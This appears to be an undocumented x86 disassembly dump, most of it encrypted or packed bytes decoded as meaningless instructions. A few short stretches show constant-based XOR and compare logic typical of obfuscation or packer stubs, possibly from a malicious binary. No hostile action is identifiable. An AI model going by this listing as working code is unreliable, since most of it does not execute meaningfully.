  4020d7:	loop   0x402091
  4020d9:	mov    ah,0x49
  4020db:	lock sbb al,0x23
  4020de:	and    BYTE PTR ds:0xe672e219,dl
  4020e4:	jg     0x4020a9
  4020e6:	push   ebp
  4020e7:	in     al,0xc7
  4020e9:	adc    dl,BYTE PTR [edi-0x3685a761]
  4020ef:	fcom   QWORD PTR [ebp+0x1b5e1914]
  4020f5:	daa    
  4020f6:	mov    edx,0xdd35ce79
  4020fb:	push   ecx
  4020fc:	in     eax,0x52
  4020fe:	xchg   DWORD PTR [ecx],edx
  402100:	inc    ebp
  402101:	pop    ebp
  402102:	and    BYTE PTR [edx],bl
  402104:	adc    BYTE PTR [esp+esi*1],dh
  402107:	shl    eax,0x2f
  40210a:	dec    eax
  40210b:	jbe    0x40218b
  40210d:	daa    
  40210e:	arpl   bp,bp
  402110:	les    edx,FWORD PTR [edi]
  402112:	aas    
  402113:	int3   
  402114:	or     al,0x33
  402116:	cwde   
  402117:	pop    ss
  402118:	dec    ecx
  402119:	push   0x71eaed45
  40211e:	jmp    0x49e10c46
  402123:	repnz es into 
  402126:	aas    
  402127:	loopne 0x4021a4
  402129:	pop    ss
  40212a:	sub    al,0xbb
  40212c:	popf   
  40212d:	mov    al,ds:0xd02b098e
  402132:	fisttp WORD PTR [edi+esi*2-0x7a]
  402136:	mov    cl,0xf9
  402138:	test   ch,cl
  40213a:	cmp    eax,0xaf6131e7
  40213f:	xchg   ecx,eax
  402140:	cmp    DWORD PTR [edi-0x69dc4d5f],ecx
  402146:	in     al,dx
  402147:	add    bl,cl
  402149:	xchg   edi,eax
  40214a:	adc    eax,0xc6c4603
  40214f:	xchg   edi,eax
  402150:	cmp    ebx,DWORD PTR [eax]
  402152:	ret    
  402153:	or     bh,dl
  402155:	xlat   BYTE PTR ds:[ebx]
  402156:	imul   BYTE PTR [edx]
  402158:	das    
  402159:	or     BYTE PTR [edx],bh
  40215b:	das    
  40215c:	dec    edi
  40215d:	sar    BYTE PTR [esi],1
  40215f:	fdiv   DWORD PTR [esi-0x78]
  402162:	push   edi
  402163:	xchg   ebx,esp
  402165:	lods   eax,DWORD PTR ds:[esi]
  402166:	mov    eax,DWORD PTR ds:0x84406ecf
  40216c:	ss stos BYTE PTR es:[edi],al
  40216e:	pop    es
  40216f:	add    BYTE PTR [esp+ebx*2-0x1d9d86a5],0x9c
  402177:	xchg   ecx,eax
  402178:	adc    DWORD PTR [ebp+0x5968993b],esp
  40217e:	cmp    BYTE PTR [esi-0x2a],bl
  402181:	(bad)  
  402183:	dec    eax
  402184:	jg     0x4021c8
  402186:	pop    esp
  402187:	mov    bl,0x8f
  402189:	test   DWORD PTR [edx],edx
  40218b:	nop
  40218c:	int    0xad
  40218e:	sub    ch,ah
  402190:	mov    edi,esi
  402192:	or     ah,BYTE PTR [ecx+ecx*4+0x763c6f11]
  402199:	jbe    0x402129
  40219b:	js     0x4021a5
  40219d:	sub    eax,DWORD PTR [eax-0x741f6a6a]
  4021a3:	pop    esi
  4021a4:	daa    
  4021a5:	call   0x67d3a095
  4021aa:	(bad)  
  4021ab:	adc    al,0x4
  4021ad:	loope  0x40219a
  4021af:	push   edx
  4021b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021b1:	pop    eax
  4021b2:	and    esp,ebp
  4021b4:	dec    esi
  4021b5:	adc    eax,0xc44973db
  4021ba:	call   0x88b4:0x65ab6f5
  4021c1:	enter  0x8f49,0xfe
  4021c5:	dec    ecx
  4021c6:	or     BYTE PTR ds:0x78fa2f3b,ch
  4021cc:	aad    0xd5
  4021ce:	ins    DWORD PTR es:[edi],dx
  4021cf:	inc    ecx
  4021d0:	pop    ebp
  4021d1:	jae    0x40218d
  4021d3:	or     BYTE PTR [esi+0xb048b45],bh
  4021d9:	jno    0x40216c
  4021db:	in     al,0xdb
  4021dd:	add    esi,eax
  4021df:	pop    ds
  4021e0:	jge    0x40218b
  4021e2:	stos   BYTE PTR es:[edi],al
  4021e3:	mov    esp,0x570ff631
  4021e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021e9:	iret   
  4021ea:	push   ecx
  4021eb:	cmp    BYTE PTR [edi],dl
  4021ed:	pop    edi
  4021ee:	mov    cl,0x9b
  4021f0:	sub    BYTE PTR [edi],ch
  4021f2:	fwait
  4021f3:	cmp    BYTE PTR [edi-0x27],0xa3
  4021f7:	and    ebp,DWORD PTR [esi+0x48]
  4021fa:	dec    edx
  4021fb:	inc    eax
  4021fc:	das    
  4021fd:	outs   dx,DWORD PTR ds:[esi]
  4021fe:	fidivr DWORD PTR [eax+0x4fea2b17]
  402204:	add    esp,ebx
  402206:	shl    DWORD PTR [eax-0x32],0xa
  40220a:	sub    BYTE PTR [esp+eiz*2-0x40],0xd7
  40220f:	inc    ebp
  402210:	inc    DWORD PTR ds:0xe9381171
  402216:	sahf   
  402217:	mov    ebx,0x50f3c62b
  40221c:	lds    edi,FWORD PTR [edi+0x59]
  40221f:	mov    ds:0x955c8fc0,eax
  402224:	add    eax,0xd488cb18
  402229:	or     DWORD PTR [edi+0x710b1d34],esp
  40222f:	rcl    bh,0x3f
  402232:	out    dx,eax
  402233:	sti    
  402234:	mov    eax,ds:0xd0be9ccc
  402239:	(bad)  [ebx]
  40223b:	jne    0x40228d
  40223d:	xor    ebp,esp
  40223f:	mov    dl,BYTE PTR [edx+0x59]
  402242:	cwde   
  402243:	in     eax,dx
  402244:	inc    edx
  402245:	pop    edx
  402246:	cmp    eax,0xdf650045
  40224b:	test   eax,0xdfbe8aca
  402250:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402251:	sub    al,0x2
  402253:	or     eax,0xbf18c89b
  402258:	push   ss
  402259:	retf   0x60bf
  40225c:	cwde   
  40225d:	es ins DWORD PTR es:[edi],dx
  40225f:	pop    es
  402260:	sbb    esi,DWORD PTR [ebx-0x6717c970]
  402266:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402268:	ja     0x402257
  40226a:	jmpw   0xb965
  40226e:	(bad)  
  402270:	cmp    DWORD PTR [eax*1+0xf78ce45],edi
  402277:	test   BYTE PTR [ecx-0x74fffffc],al
  40227d:	inc    ebp
  40227e:	in     al,dx
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR [ebx+0x70127136],ebx
  40229f:	add    dh,BYTE PTR [eax+0x70]
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	call   0x5c9b:0xf9547478
  4022ad:	sbb    al,0xa0
  4022af:	mov    dl,0x8f
  4022b1:	xlat   BYTE PTR ds:[ebx]
  4022b2:	repnz and eax,0x4dcc4566
  4022b8:	push   0x74
  4022ba:	mov    DWORD PTR [ecx+0x3ebd13b6],ecx
  4022c0:	outs   dx,DWORD PTR ds:[esi]
  4022c1:	data16 jge 0x40226e
  4022c4:	xor    ah,BYTE PTR [eax]
  4022c6:	inc    ecx
  4022c7:	aas    
  4022c8:	mov    ds:0x9ace90d,al
  4022cd:	jg     0x4022f8
  4022cf:	pop    es
  4022d0:	in     al,0x17
  4022d2:	xchg   ecx,eax
  4022d3:	jae    0x4022ae
  4022d5:	(bad)
  4022d9:	es sub dh,bl
  4022dc:	lahf   
  4022dd:	mov    ds,WORD PTR [edx-0x16]
  4022e0:	sahf   
  4022e1:	je     0x402310
  4022e3:	xchg   ebx,eax
  4022e4:	popa   
  4022e5:	fwait
  4022e6:	sti    
  4022e7:	in     al,dx
  4022e8:	call   0x763b5370
  4022ed:	inc    esi
  4022ee:	add    al,0x7b
  4022f0:	aam    0xba
  4022f2:	fcompp 
  4022f4:	inc    ebx
  4022f5:	gs (bad) 
  4022f7:	rcr    BYTE PTR [esi],1
  4022f9:	sub    al,al
  4022fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022fc:	jns    0x4022d0
  4022fe:	xor    DWORD PTR [ecx],ebx
  402300:	xor    BYTE PTR [edi],ah
  402302:	js     0x4022c8
  402304:	push   edx
  402305:	add    DWORD PTR [ebx+0x5b491e04],edx
  40230b:	pop    esi
  40230c:	aas    
  40230d:	mov    esi,0xda16d330
  402312:	int    0xd5
  402314:	mov    eax,0xd4928a6a
  402319:	xchg   esp,eax
  40231a:	ins    BYTE PTR es:[edi],dx
  40231b:	jns    0x402325
  40231d:	sub    DWORD PTR [esi-0xa1bfc97],0x575f48a0
  402327:	stos   BYTE PTR es:[edi],al
  402328:	call   0x2548:0x6f2625a8
  40232f:	pop    ss
  402330:	fs test edx,esp
  402333:	add    al,BYTE PTR [esi-0x35]
  402336:	popa   
  402337:	(bad)  
  402338:	lock jb 0x40239e
  40233b:	or     BYTE PTR [ebx],cl
  40233d:	jecxz  0x40237c
  40233f:	jl     0x4023bc
  402341:	jmp    0x40233b
  402343:	jmp    0xb284ff7f
  402348:	sub    edi,ebp
  40234a:	clc    
  40234b:	or     esi,DWORD PTR [ecx]
  40234d:	adc    esp,edx
  40234f:	jae    0x4022ea
  402351:	(bad)  
  402352:	mov    ds:0x85585eb5,al
  402357:	sbb    ecx,DWORD PTR [ecx]
  402359:	inc    edi
  40235a:	mov    edi,0xf345a941
  40235f:	jmp    0x4f956ab2
  402364:	sbb    al,0xb
  402366:	shl    ebp,cl
  402368:	mov    esi,cs
  40236a:	jecxz  0x4023a4
  40236c:	mov    edx,0x7850c2d7
  402371:	adc    bh,BYTE PTR [edi]
  402373:	ins    BYTE PTR es:[edi],dx
  402374:	imul   ebp,ecx,0x35
  402377:	push   ecx
  402378:	or     al,0x49
  40237a:	add    BYTE PTR ds:0xae2fd823,ah
  402380:	pop    esi
  402381:	jge    0x402319
  402383:	jle    0x402397
  402385:	arpl   WORD PTR [esi-0x67f8b6de],di
  40238b:	shl    DWORD PTR [ebx],1
  40238d:	mov    edx,0xa099ba03
  402392:	adc    edi,DWORD PTR [ebx+0x47]
  402395:	stos   DWORD PTR es:[edi],eax
  402396:	xor    DWORD PTR [ebp+ebx*4-0x38f8c64],eax
  40239d:	adc    eax,DWORD PTR [esi]
  40239f:	or     DWORD PTR [ebp-0x24],eax
  4023a2:	gs dec ebx
  4023a4:	fwait
  4023a5:	pushf  
  4023a6:	bound  eax,QWORD PTR [eax+edx*8]
  4023a9:	mov    DWORD PTR [eax+0x57],ebp
  4023ac:	popf   
  4023ad:	or     eax,0x166379a1
  4023b2:	enter  0xcb8b,0x18
  4023b6:	(bad)  
  4023b7:	lods   al,BYTE PTR ds:[esi]
  4023b8:	leave  
  4023b9:	fidiv  DWORD PTR [eax]
  4023bb:	adc    bl,BYTE PTR [ecx]
  4023bd:	xlat   BYTE PTR ds:[ebx]
  4023be:	cdq    
  4023bf:	jge    0x40235d
  4023c1:	ins    BYTE PTR es:[edi],dx
  4023c2:	sar    BYTE PTR ss:[edi-0x6ca5c2b6],1
  4023c9:	cli    
  4023ca:	mov    ah,0x7e
  4023cc:	pop    eax
  4023cd:	mov    eax,ds:0xa2f8f87c
  4023d2:	loopne 0x40240f
  4023d4:	fcom   DWORD PTR [esi+0x471f47ae]
  4023da:	out    0xf8,eax
  4023dc:	mov    esi,0x274aa611
  4023e1:	sbb    ch,ah
  4023e3:	(bad)  [edx+0x2f]
  4023e6:	stos   DWORD PTR es:[edi],eax
  4023e7:	fisttp QWORD PTR [ebp-0x2c]
  4023ea:	icebp  
  4023eb:	push   ebx
  4023ec:	sti    
  4023ed:	je     0x4023da
  4023ef:	lock inc edx
  4023f1:	xor    BYTE PTR [edi+0x2a1d2ff3],cl
  4023f7:	jle    0x402470
  4023f9:	jbe    0x402459
  4023fb:	adc    DWORD PTR [esi],edi
  4023fd:	push   es
  4023fe:	xchg   ecx,eax
  4023ff:	ror    BYTE PTR [edi-0x2d1c0388],cl
  402405:	push   ds
  402406:	rcr    DWORD PTR [esi],cl
  402408:	fwait
  402409:	cld    
  40240a:	adc    al,0x99
  40240c:	and    bl,al
  40240e:	lds    esi,FWORD PTR [esi+ebx*8+0x66938ced]
  402415:	out    0xad,al
  402417:	aaa    
  402418:	iret   
  402419:	mov    dl,0x65
  40241b:	sar    BYTE PTR [ebp+edx*4-0x2f],cl
  40241f:	ins    BYTE PTR es:[edi],dx
  402420:	cmp    dl,dl
  402422:	xor    edi,DWORD PTR [ecx-0x5a]
  402425:	(bad)  [edi+eax*4+0x745a171d]
  40242c:	pop    ecx
  40242d:	and    al,0x1a
  40242f:	into   
  402430:	cli    
  402431:	imul   eax,eax,0x647fd1c5
  402437:	add    ecx,0x7c3f7ec7
  40243d:	jmp    0x66b001fd
  402442:	xor    al,ch
  402444:	sub    BYTE PTR [ebx],dl
  402446:	mov    ds:0xd30c947e,eax
  40244b:	fst    QWORD PTR [ecx+0x4f4b130a]
  402451:	add    BYTE PTR [edx],bh
  402453:	jl     0x4023d9
  402455:	mov    edx,0x1cc1a290
  40245a:	loop   0x4023fc
  40245c:	lahf   
  40245d:	sub    DWORD PTR [ecx+0x5],esp
  402460:	lahf   
  402461:	jo     0x402476
  402463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402464:	pusha  
  402465:	jmp    0x97157a1c
  40246a:	cmp    al,0xd4
  40246c:	imul   ecx,DWORD PTR [edx],0xfffffffb
  40246f:	icebp  
  402470:	test   DWORD PTR [edi],0xfb473f96
  402476:	cld    
  402477:	mov    bh,0x40
  402479:	ins    DWORD PTR es:[edi],dx
  40247a:	adc    al,ch
  40247c:	stc    
  40247d:	jge    0x402492
  40247f:	test   BYTE PTR [edi+ebp*1-0x60],bl
  402483:	hlt    
  402484:	fimul  WORD PTR [ecx+0x30]
  402487:	(bad)  
  402488:	mov    DWORD PTR [esi-0x5c354a43],ecx
  40248e:	mov    WORD PTR [ebx],fs
  402490:	popf   
  402491:	mov    cl,BYTE PTR [edi]
  402493:	outs   dx,BYTE PTR ds:[esi]
  402494:	rcl    DWORD PTR [ecx-0x43],0xb9
  402498:	sub    DWORD PTR [esi],0x3f
  40249b:	pop    es
  40249c:	fdivr  QWORD PTR [edi-0x2725169c]
  4024a2:	mov    ebp,0x66ca83f2
  4024a7:	mov    edx,DWORD PTR [ebp-0x38]
  4024aa:	mov    ebx,0x8a3e
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx+0x6dda8937],cl
  4024f4:	shl    DWORD PTR [eax+0x0],0x70
  4024f8:	jo     0x40256a
  4024fa:	jle    0x40256c
  4024fc:	jo     0x4024c8
  4024fe:	dec    ebp
  4024ff:	daa    
  402500:	sub    eax,0xf4aa2e26
  402505:	mov    ecx,0xc4306891
  40250a:	mov    ds:0x928186cd,eax
  40250f:	ds aaa 
  402511:	clc    
  402512:	cld    
  402513:	mov    esp,0xaf6609be
  402518:	adc    edx,ebx
  40251a:	xchg   ebx,eax
  40251b:	or     DWORD PTR [ecx-0x1b],ecx
  40251e:	aaa    
  40251f:	ins    BYTE PTR es:[edi],dx
  402520:	jns    0x4024a2
  402522:	add    eax,0xd2a6a78d
  402527:	mov    dh,0xc2
  402529:	push   ds
  40252a:	adc    edi,DWORD PTR gs:[edx-0x7b]
  40252e:	pop    DWORD PTR [ebx]
  402530:	inc    edi
  402531:	inc    edx
  402532:	pop    ebp
  402533:	hlt    
  402534:	xchg   DWORD PTR [ebp-0x3a],esp
  402537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402538:	jae    0x402555
  40253a:	jne    0x402500
  40253c:	scas   al,BYTE PTR es:[edi]
  40253d:	jne    0x40250e
  40253f:	mov    ebp,ebx
  402541:	in     al,0x56
  402543:	cmc    
  402544:	fist   DWORD PTR [edx-0x3f5e3e7c]
  40254a:	into   
  40254b:	aaa    
  40254c:	push   esi
  40254d:	loop   0x4025a7
  40254f:	je     0x4025a3
  402551:	sub    bl,al
  402553:	nop
  402554:	mov    al,ah
  402556:	add    BYTE PTR [ecx-0x5a0d79c3],cl
  40255c:	pop    es
  40255d:	cmp    al,0xc6
  40255f:	loope  0x4024f7
  402561:	fisubr WORD PTR [ecx+0x22]
  402564:	cmp    BYTE PTR [ebx-0x5a],ah
  402567:	mov    esi,0xc6a53ea7
  40256c:	jg     0x40251c
  40256e:	imul   esi,DWORD PTR [esi],0xf4622e4b
  402574:	ins    DWORD PTR es:[edi],dx
  402575:	sub    BYTE PTR [edx+0x3c],ch
  402578:	stos   DWORD PTR es:[edi],eax
  402579:	jmp    0x8570:0x1bb98fdd
  402580:	fimul  DWORD PTR [eax+edi*8]
  402583:	lahf   
  402584:	cmp    al,0x6
  402586:	mov    ah,0xcc
  402588:	in     eax,dx
  402589:	and    DWORD PTR [ebx],esp
  40258b:	cld    
  40258c:	xor    al,0xd5
  40258e:	ins    BYTE PTR es:[edi],dx
  40258f:	adc    DWORD PTR [ebp+ebx*8-0x2c],ecx
  402593:	aas    
  402594:	mov    bh,0x4a
  402596:	fisttp DWORD PTR [ecx+0x68]
  402599:	ss push eax
  40259b:	scas   al,BYTE PTR es:[edi]
  40259c:	jae    0x40252c
  40259e:	dec    edx
  40259f:	cwde   
  4025a0:	rcr    BYTE PTR [edx+edi*1-0x752464],1
  4025a7:	inc    ecx
  4025a8:	mov    BYTE PTR [ebp+0x7e1a6b17],dl
  4025ae:	pop    esp
  4025af:	call   0x168c:0x4bed5e8
  4025b6:	or     al,0xdf
  4025b8:	sub    esp,DWORD PTR [ecx-0x563159f1]
  4025be:	mov    esi,0xdee5828e
  4025c3:	add    al,0x38
  4025c5:	je     0x40262d
  4025c7:	bound  edi,QWORD PTR [eax]
  4025c9:	or     DWORD PTR [ebx+0x1f298b4e],esi
  4025cf:	inc    ecx
  4025d0:	mov    ds:0xd2c67871,al
  4025d5:	imul   ebp,edx,0xc7634a56
  4025db:	xor    ebp,DWORD PTR [ebp-0x4b]
  4025de:	je     0x402627
  4025e0:	nop
  4025e1:	mov    eax,ds:0xfe9a58cf
  4025e6:	push   ds
  4025e7:	aaa    
  4025e8:	enter  0x12d3,0x40
  4025ec:	cmp    bl,BYTE PTR ds:0x7874233d
  4025f2:	es scas al,BYTE PTR es:[edi]
  4025f4:	test   al,0x76
  4025f6:	fcomp  QWORD PTR [ebp+0x463d7dc3]
  4025fc:	cmc    
  4025fd:	mov    edx,0x1a8bad28
  402602:	cld    
  402603:	pop    esi
  402604:	push   ss
  402605:	ins    DWORD PTR es:[edi],dx
  402606:	add    al,0xb6
  402608:	psrlw  mm6,QWORD PTR [ecx+0x5c]
  40260c:	jmp    0x2d1e5c66
  402611:	clc    
  402612:	js     0x402686
  402614:	in     al,0x5e
  402616:	jg     0x402640
  402618:	push   edx
  402619:	push   0xaa47c3d6
  40261e:	int    0x64
  402620:	imul   edx,DWORD PTR [esi],0x7e05fa72
  402626:	in     al,dx
  402627:	and    al,0x44
  402629:	ds loop 0x40263b
  40262c:	xchg   esp,eax
  40262d:	sti    
  40262e:	out    0xe,eax
  402630:	fcmovu st,st(4)
  402632:	sub    ah,BYTE PTR [ebx-0x7710d796]
  402638:	pop    ecx
  402639:	cmp    BYTE PTR [edi+eiz*1],bl
  40263c:	es cmc 
  40263e:	loopne 0x402692
  402640:	mov    ah,0x5
  402642:	and    DWORD PTR [ebx-0x336a4b77],0xffffff8d
  402649:	mov    bl,0x1
  40264b:	aas    
  40264c:	mov    ecx,0x7b40f5ae
  402651:	addr16 (bad) 
  402653:	fcomip st,st(7)
  402655:	pop    ss
  402656:	inc    edx
  402657:	out    0x2c,eax
  402659:	imul   edi,DWORD PTR [edi+0x3661b4cd],0xffffffab
  402660:	pusha  
  402661:	mov    ch,0x8b
  402663:	xlat   BYTE PTR ds:[ebx]
  402664:	inc    ebx
  402665:	into   
  402666:	addr16 pushf 
  402668:	mov    ds:0xed2831eb,eax
  40266d:	stos   BYTE PTR es:[edi],al
  40266e:	add    bh,BYTE PTR [edi+0x73]
  402671:	iret   
  402672:	jge    0x4026c2
  402674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402675:	fistp  DWORD PTR [edi+0x3]
  402678:	ds or  al,0xe5
  40267b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40267c:	or     BYTE PTR [ecx+0x13],al
  40267f:	mov    ch,cl
  402681:	nop
  402682:	sub    ah,ch
  402684:	mov    es:0x2846d4a5,al
  40268a:	into   
  40268b:	jno    0x402657
  40268d:	mov    ah,0x84
  40268f:	push   cs
  402690:	and    bl,BYTE PTR [ecx+0x637073e2]
  402696:	sahf   
  402697:	cwde   
  402698:	jecxz  0x402623
  40269a:	pop    ebp
  40269b:	xchg   esi,eax
  40269c:	cmc    
  40269d:	ret    
  40269e:	fcos   
  4026a0:	mov    cl,0x72
  4026a2:	and    bh,BYTE PTR [edi+esi*4-0x54a6a351]
  4026a9:	in     eax,dx
  4026aa:	push   ebx
  4026ab:	lock into 
  4026ad:	adc    bl,BYTE PTR [ecx+edx*1+0x41]
  4026b1:	imul   DWORD PTR [esi]
  4026b3:	push   edi
  4026b4:	push   edi
  4026b5:	fcmove st,st(2)
  4026b7:	cli    
  4026b8:	inc    eax
  4026b9:	(bad)  
  4026ba:	xchg   esi,eax
  4026bb:	jmp    0x40265f
  4026bd:	hlt    
  4026be:	cmp    dl,BYTE PTR [ebx+0x5f]
  4026c1:	inc    esp
  4026c2:	mov    edi,0x4ea1756e
  4026c7:	add    al,0xe9
  4026c9:	ret    
  4026ca:	pop    esi
  4026cb:	inc    ecx
  4026cc:	push   ss
  4026cd:	rcl    edi,1
  4026cf:	jle    0x40271b
  4026d1:	or     al,0x61
  4026d4:	out    0x2,eax
  4026d6:	mov    edx,ebx
  4026d8:	aam    0xba
  4026da:	(bad)  
  4026db:	dec    esp
  4026dc:	(bad)  
  4026dd:	xchg   edx,eax
  4026de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026df:	pop    ebx
  4026e0:	shr    ebp,1
  4026e2:	mov    ah,BYTE PTR [ebp-0x35]
  4026e5:	pushf  
  4026e6:	aad    0x12
  4026e8:	popf   
  4026e9:	iret   
  4026ea:	mov    edi,0x1f6c2e5f
  4026ef:	or     dl,0xc8
  4026f2:	push   es
  4026f3:	sub    al,0x57
  4026f5:	shl    DWORD PTR [eax],cl
  4026f7:	imul   ebx,ebp,0x9bc6b7b8
  4026fd:	mov    eax,DWORD PTR [ebp-0xc]
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0x1d2e070
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	popf   
  402768:	push   es
  402769:	mov    esp,0x82e91701
  40276e:	add    al,0xd0
  402770:	test   DWORD PTR cs:[eax],edi
  402773:	mov    cl,0x89
  402775:	rcl    dl,0x5c
  402778:	xchg   BYTE PTR [eax+0x3d],cl
  40277b:	jne    0x402768
  40277d:	lds    eax,FWORD PTR [ebx-0x637f2d13]
  402783:	rcl    DWORD PTR [ecx+0x52c84211],cl
  402789:	fnsave ds:0x78b92e69
  40278f:	outs   dx,BYTE PTR ds:[esi]
  402790:	repz das 
  402792:	or     eax,0x1b61559c
  402797:	cmp    al,0x86
  402799:	call   DWORD PTR [ecx+0x1e14ca23]
  40279f:	fmulp  st(5),st
  4027a1:	push   ss
  4027a2:	push   ds
  4027a3:	jno    0x40275d
  4027a5:	xor    DWORD PTR [ebx+0x44810c03],0x64cccf4b
  4027af:	push   eax
  4027b0:	sub    DWORD PTR [ecx],ebx
  4027b2:	mov    ecx,0xee851bc2
  4027b7:	shr    DWORD PTR [ecx],0xf3
  4027ba:	stos   DWORD PTR es:[edi],eax
  4027bb:	cli    
  4027bc:	jle    0x40278e
  4027be:	test   al,0xcf
  4027c0:	sbb    al,0x76
  4027c2:	(bad)  
  4027c3:	pop    edx
  4027c4:	pop    eax
  4027c5:	and    al,BYTE PTR [edi+ecx*4]
  4027c8:	and    DWORD PTR [ebx-0x649b435d],0x2f
  4027cf:	xchg   edx,eax
  4027d0:	push   esp
  4027d1:	sahf   
  4027d2:	mov    esp,0x4243071
  4027d7:	fldcw  WORD PTR [edi+0x1b]
  4027da:	ins    DWORD PTR es:[edi],dx
  4027db:	and    ecx,DWORD PTR [edx-0x1acc439]
  4027e1:	push   ebp
  4027e2:	ins    DWORD PTR es:[edi],dx
  4027e3:	push   ecx
  4027e4:	dec    ebx
  4027e5:	outs   dx,DWORD PTR ds:[esi]
  4027e6:	xlat   BYTE PTR ds:[ebx]
  4027e7:	push   es
  4027e8:	out    dx,al
  4027e9:	stc    
  4027ea:	loop   0x4027e4
  4027ec:	fdiv   QWORD PTR [ebp+eax*4+0xd677cd5]
  4027f3:	xor    DWORD PTR [ebp-0x7ef4667a],ecx
  4027f9:	adc    DWORD PTR [ebx+ebp*8+0x5a],esi
  4027fd:	cmp    eax,0xecd90929
  402802:	mov    bl,0x3
  402804:	mov    WORD PTR [ebx],?
  402806:	das    
  402807:	hlt    
  402808:	sub    al,0x66
  40280a:	jmp    0x50821b84
  40280f:	(bad)  
  402810:	fidiv  DWORD PTR [eax+edi*4]
  402813:	jb     0x40283e
  402815:	(bad)
  402818:	xchg   al,al
  40281a:	push   ecx
  40281b:	(bad)  
  40281c:	repz add bh,BYTE PTR [ecx+0x3a3ad253]
  402823:	xchg   ecx,eax
  402824:	mov    ecx,0xcc77cb43
  402829:	jbe    0x40288f
  40282b:	and    ch,ah
  40282d:	jge    0x402897
  40282f:	xor    DWORD PTR [edi+edi*4+0x6d],ebx
  402833:	(bad)  
  402834:	fcomip st,st(6)
  402836:	and    al,0x77
  402838:	inc    DWORD PTR [ebp-0x4a58bdec]
  40283e:	fwait
  40283f:	push   ecx
  402840:	scas   al,BYTE PTR es:[edi]
  402841:	jno    0x402836
  402843:	push   ecx
  402844:	mov    ch,0x8d
  402846:	mov    ds:0x8c69cf16,al
  40284b:	adc    DWORD PTR [ecx],edx
  40284d:	pop    edx
  40284e:	sub    dh,dl
  402850:	mov    bl,0x67
  402852:	inc    eax
  402853:	mov    eax,gs
  402855:	add    eax,DWORD PTR [ebp+0x642b741a]
  40285b:	mov    ah,0x9e
  40285d:	out    0x65,al
  40285f:	imul   esi,DWORD PTR [eax-0x5d],0xffffffb8
  402863:	push   ecx
  402864:	pop    ss
  402865:	ds pop ds
  402867:	xor    eax,0xf3fe8087
  40286c:	mov    ds:0xb188caf8,eax
  402871:	or     eax,0x9ebdf3bb
  402876:	and    BYTE PTR [edi-0xe206c84],dh
  40287c:	cmp    eax,0xdc77936e
  402881:	popf   
  402882:	push   es
  402883:	xor    cl,bh
  402885:	or     dl,0xc7
  402888:	int3   
  402889:	mov    ds,WORD PTR [eax+0x3d]
  40288c:	xlat   BYTE PTR ds:[ebx]
  40288d:	dec    esp
  40288e:	mov    ah,0xe0
  402890:	dec    edi
  402891:	icebp  
  402892:	(bad)  
  402894:	out    dx,eax
  402895:	push   0x317e2137
  40289a:	mov    WORD PTR [ebx-0x695508aa],?
  4028a0:	or     ch,ah
  4028a2:	out    0xba,eax
  4028a4:	gs pop bx
  4028a7:	fisttp WORD PTR [ebx+0x2e]
  4028aa:	hlt    
  4028ab:	adc    BYTE PTR [ebp+eax*1-0x555a042e],al
  4028b2:	ret    0xa0e1
  4028b5:	imul   edi,DWORD PTR [ebx+esi*4+0x3b9fb913],0xffffffa8
  4028bd:	xchg   ecx,eax
  4028be:	dec    edx
  4028bf:	pop    ebx
  4028c0:	xor    BYTE PTR [esi],ch
  4028c2:	dec    esp
  4028c3:	add    al,0x1e
  4028c5:	xchg   esp,eax
  4028c6:	aas    
  4028c7:	xor    BYTE PTR [ebx],al
  4028c9:	clc    
  4028ca:	push   ebp
  4028cb:	fiadd  DWORD PTR [edi+0xf919bd1]
  4028d1:	sbb    BYTE PTR [ebp+0x2d61422a],ch
